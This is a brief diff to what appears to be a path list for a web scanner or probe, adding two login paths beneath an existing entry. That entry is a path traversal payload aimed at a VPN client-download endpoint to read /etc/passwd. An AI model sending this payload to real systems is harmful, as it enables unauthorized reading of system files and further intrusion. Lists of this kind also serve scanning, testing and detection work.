@@ -1,1 +1,3 @@
 /vpn/user/download/client?ostype=../../../../../../../etc/passwd
+/remote/login
+/login
